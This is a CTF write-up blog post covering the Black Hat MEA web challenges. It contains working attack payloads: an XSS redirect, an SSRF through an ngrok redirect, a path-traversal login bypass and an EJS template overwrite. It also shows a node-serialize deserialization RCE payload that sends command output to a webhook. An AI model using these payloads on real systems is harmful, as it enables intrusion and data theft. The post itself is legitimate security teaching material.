---
title: "black-Hat-MEA-CTF | ALL Web challenges "
date: 2022-09-21
# weight: 1
tags: ["blackhat", "CTFS", "Web", "black-Hat-MEA-CTF"]
author: "@zero"
# author: ["Me", "You"] # multiple authors
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Solving black-Hat-MEA-CTF All Web challenges."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://i.imgur.com/XDof3SV.png" # image path/url
    alt: "Black-Hat-CTF" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
---

# web challenge -  Spatify

![enter image description here](https://i.imgur.com/TRwGJ5v.png)

and here once we open challenge 

![enter image description here](https://i.imgur.com/5juQ9EY.png)

 i see there is music called learn SQL mmm ok lets explore more as usual check the robots.txt and there is admin page in /superhiddenadminpanel/ endpoint  shown in fig 
 ![enter image description here](https://i.imgur.com/vcf4RDo.png)

here is admin page look like 

![enter image description here](https://i.imgur.com/oIpxUKu.png)

basicly we need a password to log in i tried to inject in admin panel but its useless back to main page of chall trying to add ' > its need to add 5 chars so tried with '''' and nothing  tried with some special chars like * and % and here we go i see % success and give us 

![enter image description here](https://i.imgur.com/jtGOyJH.png)

give us endpoint to /static/audio/secret_password_backup.txt.bak contains admin password back to log in with password and here we got the flag 

![enter image description here](https://i.imgur.com/2ul71Jo.png)

flag : BlackHatMEA{957:14:5949fdc31b4bf2f1561b678a8e9fe4fa617dd280} 

# web challenge - peeHpee
![enter image description here](https://i.imgur.com/QpgLi02.png)

we got this once we open the challenge 

![enter image description here](https://i.imgur.com/O1oFbM9.png)

checking the source endpoint  commented in the source code

     "Check /?source= for the source code --> "

 
![enter image description here](https://i.imgur.com/XZzhsSp.png)

by give a look in code .. we have  an ( email - test - pass ) parametrs  and we have a valied email and password once we trying to log in with creds login failed casue test param missed 
added test parameter  and  by pass the $x to escape regex look like this
 
![enter image description here](https://i.imgur.com/21qLR80.png)

and we suceefull login and here is our flag 

![enter image description here](https://i.imgur.com/WAhq5m8.png)

flag : BlackHatMEA{957:17:213fbe52ba8275bc20949ce56d069f56f9bc9095}

 #  Web challenge -  Meme Generator 
 ![enter image description here](https://i.imgur.com/OKuYhIf.png)

by clicking in VIEW SAUCE we gotta this 

![enter image description here](https://i.imgur.com/ZBBmWxg.png)

lets explain what hapenning :>
@app.route / flag >> mean we should request /flag to print our flag 
reguser_addr = " 127.0.0.1"  >>its mean we need domain refere to local host
request.url.startwith l0calhost >> mean we need subdomain start with l0calhost
port 8080 >> mean port 8080 lol :>
conclude : we need a subdomain start with l0calhost refers to local host with port 8080 and in the end /flag 
we have 2 ways to got this 
1. using localtest.me and pass it our subdomain and port like this http://l0calhost.localtest.me:8080/flag
2. or using fbi domain lmao will work too [http://l0calhost.fbi.com:8080/flag   FBI OPEN UP you can try ping 
will work and refere to locaã host lol
secound question is .. where should we inject this subdomain ? in fact i dont know 
wait wait im joking 
i have two solution lets explain:
first one inect as xss with document.location will work after trying i can perform there is XSS and we can use it to complete this mission by passing this payloed to 
test">"+document.location=http://l0calhost.fbi.com/flag & OR test">"+document.locationhttp://l0calhost.fbi.com:8080/flag 
this way will success and print the flag in same page 
scound way is : 
inject using curl & ngrok 

    curl -X POST --url "https://blackhat3-12467700c2749bd40efb1308b4b070f9-0.chals.bh.ctf.sa/api/generate" -F search_engine=88fc-113-173-115-76.ngrok.io\?nani= -F query=123

so :
88fc-113-173-115-76.ngrok.io points to my local server, that will sends a 302 response back to l0calhost.localtest.me:8080/flag and also success
with both ways we can get the flag 
flag :   BlackHatMEA{957:22:0907a3bda393a68b4fde6e35b2b599f9d67c3b99}

# web challenge - Black Note
 ![enter image description here](https://i.imgur.com/FvzHKZi.png)

once we open challenge we gotta this 

![enter image description here](https://i.imgur.com/hrDqhhG.png)

Sign up with random creds , Fuzzing ,cheking source code as usal , when i loged in i can see another page


![enter image description here](https://i.imgur.com/PSXWtyK.png)

typed any thing and captured request 


![enter image description here](https://i.imgur.com/nbJwoBD.png)

yes i noticed notes cookie is base64 lets decode it  `>>{"notes":{"0":Sample Note ","1":"hello word"}}`

seems intersting i start play with this notes untill i gotta error 

![enter image description here](https://i.imgur.com/X8tWyKE.png)

node-selalize >> this make us think about deserialization attack , i start searching in google and found article RCE in nodeJS via  deserialization attack
here is the link of article : 
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
cool lets start the exploite 
here is our payloed : 

    {"notes":{"0":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'curl <your webhook url> -d \\"ls=$(ls /)\\" /\', function(error, stdout, stderr) { console.log(stdout) });}()"}}

just we eant to pass our webhook url or any interaction server will work 
https://webhook.site/
After that we should decode payloed again and pass it in notes with webhook url and see if we gotta response or no 
![enter image description here](https://i.imgur.com/culCBDR.png)

and yes we got response in webhook

![enter image description here](https://i.imgur.com/YslzXdl.png)

cool , lets read flag "ranDom_fl4gImportant.txt"

edit payloed and replace ls to cat /ranDom_fl4gImportant.txt and return to webhook and yes here is the flag
 
![enter image description here](https://i.imgur.com/Vkeps0a.png)

flag :BlackHatMEA{981:18:ee542016dc185cd06c6adbdd034c8e19d7780d7d}

# web challenge - Jimmy’s Blog

> Hard

>Description: The technology is always evolving, so why do we still stick with password-based authentication? That makes no sense! That’s why I designed my own password-less login system. I even open-sourced it for everyone interested, how nice of me!

 (@Rpi9) and (@0_Zero_0) solved this challenge together.

  

we were given a website link and the challenge ("[Source Code](https://www.mediafire.com/file/1veynhabrcaux0g/jimmys_blog.zip/file)")

  

we went to the website to take a look at what it does and it is a blog for someone named Jimmy

  

with Login, Register and Article Page.

  

![enter image description here](https://i.imgur.com/IWrY5cn.png)

  

Nvm, we read those articles to know what Jimmy published in his Blog

  

its basically an authentication system without needing a password

  

just a username and the site automatically generates an encryption key for you to be able to login.

  

![enter image description here](https://i.imgur.com/h0IrG9C.png)

  

that is the main idea \ next step is to check the site but in a dynamic way try it i mean, so we basically went to register page and created an account with username hecker :/:

  

![enter image description here](https://i.imgur.com/so995lM.png)

  

as you see it generated a key with the name we typed with .key ext

  

we tried to make another account with the same username but nope it said username already taken xd

  

also we tried to read this key but wasn't useful, next step is to try the login

  

![enter image description here](https://i.imgur.com/BuQt2ZH.png)

  

it asks for the username and the access key were given while creating your account.

  

after we logged in just the same article page and Logout button lol?

  

we noticed that there is nothing interesting here, so we moved to the source code

  

we fired node to run the blog locally we started the fight :D

  

we read the basic main files [ run.sh, note.txt, nginx.conf, Dockerfile ]

  

nope nothing there, so let's review the juicy javascript code xd

  

we started with index.js it just routing the requests /login, /register..etc

  

but But there was something that caught my attention | those two functions

  

1- Show the content of the articles but you should be an admin

  

    `
    app.get("/edit", (req, res) => {
        if (!req.session.admin) return res.sendStatus(401);

            const id = parseInt(req.query.id).toString();

            const article_path = path.join("articles", id);

            try {

            const article = fs.readFileSync(article_path).toString();

            res.render("edit", { article: article, session: req.session, flag: process.env.FLAG });

            } catch {

                res.sendStatus(404);

            }
    })



        
    `


  

first one is check if there is a session admin to be able to see the content the edit articles as you see there is flag: process.env.FLAG being render

2- Edit The Content of the articles

  


    
    `
        app.post("/edit", (req, res) => {

        if (!req.session.admin) return res.sendStatus(401);

        try {

        fs.writeFileSync(path.join("articles", req.query.id), req.body.article.replace(/\r/g, ""));

        res.redirect("/");

        } catch {

        res.sendStatus(404);

        }

    })      
        
    `

  

it's an endpoint only admins can access it to edit the articles without filtering the content so that means we can found path traversal vulnerability, so how can we be admins?... fine let's continue reading the code

  

so next file was this **edit.ejs** of course to see how this file prints the flag | nothing was interested but one thing was

  


    `
    <!doctype html>

    <html>

        <%- include('head.ejs') %>

            <body  class="text-dark bg-light">

            <%- include('navbar.ejs') %>

            <div  class="container my-5 px-5">

            <h3  class="text-center">Welcome jimmy_jammy, your flag is</h3>

            <p  class="mb-5 text-center"><%= flag %></p>

            <h3>Meanwhile, please feel free to edit your article</h3>

            <form  method="POST">

            <textarea  class="form-control mb-3"  rows="15"  name="article"><%= article %></textarea>

            <button  type="submit"  class="btn btn-dark w-100">Save Changes</button>

            </form>

            </div>

            <%- include('scripts.ejs') %>

            </body>
    </html>
    `

  

1. html tag  with `<h3>` Welcome jimmy_jammy`</h3>`

2. we realized that this the admin name because the blog named jimmy's blog so this 90% the admin username next step is to find a way to login in as jimmy_jammy.

  
  
  

so we started see the main authentication files (register.ejs, login.ejs)

and the common file in all files was (**utils.js**) so we started with it

[utils.js](utils.js)
![enter image description here](https://i.imgur.com/sfWOF2I.png)

  

is contains the main functions of Database inserting users, login check


1. there is username registered jimmy_jammy and admin value is 1

2. if you noticed that in register function admin = 0 for normal users

3. line 21 it looks like the script is not filtering the value so why we don't give a try for path traversal vulnerability. :::

  

so why we don't give it a try to register but using the vulnerability on our side

  

let's get into the first exploit:

  

- First step creating a user with this username to get the key of the admin ( jimmy_jammy ) => username: **`../keys/jimmy_jammy`**

  

![enter image description here](https://i.imgur.com/lmdoQOK.png)

Great, we got the admin's encryption key now we can login as the admin |\^:^/

![enter image description here](https://cdn.discordapp.com/attachments/973549672608186398/1025866986938433536/unknown.png)

  

![enter image description here](https://cdn.discordapp.com/attachments/973549672608186398/1025867501353062470/unknown.png)

  

Cool!, since we became admins, so we can view edit page and get our flag!,

![enter image description here](https://cdn.discordapp.com/attachments/973549672608186398/1025868230448910386/unknown.png)

  

Huh? is that my flag really? nvm we checked all files but we returned back to see if we missed something and yeah we missed the ngnix.conf file

  


    `
        server {

        listen 80 default_server;

        listen [::]:80 default_server;

          

        server_name _;

          

        location / {

        # Replace the flag so nobody steals it!

        sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';

        sub_filter_once off;

        proxy_pass http://localhost:3000;

        }

    }
    `

  

Oops, Flag is being replaced `# Replace the flag so nobody steals it!`

`sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';`

  

so we can't continue locally

Note: Don't forget we have a path traversal in edit page via id parameter.

  
while `writeFileSyncwhich()`allows us to re-write the file content to whatever we want so why we don't get a Nice RCE :D



via SSTI (Server Side Template Injection) we can determine the vulnerability by following this endpoint `?id=../views/navbar.ejs`

  

![enter image description here](https://media.discordapp.net/attachments/1025465085117866045/1025730056762445904/phishing_email.png)

actually i forgot to take a screenshot of the SSTI but trust me it is vulnerable :DD
  
  let's continue after we determined the vuln exists next move is to get RCE 



but instead of this we will bruteforce the flag and print it in all `articles pages`  

because we solved many challs like this so bruteforce was our first choice.

by overriding the article file with following script

    `
    <!doctype  html>

        <html>

        <%- include('head.ejs') %>

        <body  class="text-dark bg-light">

        <%- include('navbar.ejs') %>

        <div  class="container my-5 px-5">

        <div  class="card mb-4">

        <div  class="card-header">

        <%= article.date %>

        </div>

        <div  class="card-body">

        <h5  class="card-title"><%= article.title %></h5>

        <p  class="card-text">

        <%= article.summary %>

        <hr  class="mb-0">

        <div  class="pre-line">

        <%= article.content %>

        </div>

        </p>

        </div>

        <div  class="card-footer text-muted">

            <% for (var i =0; i <=59;  i++ ) { %> 
                        <%=  flag[i] %>
            <% } %>

        Generated by shriperis 

        </div>

        </div>

        </div>

        <%- include('scripts.ejs') %>

        </body>

    </html>
    `  

so we intercepted the request while we editing any article and we used the vuln via id param and the endpoint was `?id=../views/navbar.ejs` then we encoded our js payload as a url-encoded 
and we replaced article value to our script

and we forwarded the request and guess!

Bingo!
![enter image description here](https://i.imgur.com/gCoZWWe.png)


![enter image description here](https://miro.medium.com/max/1400/1*_nWlEGA12PRqerHc81l6IQ.png)

Thanks For Reading..!
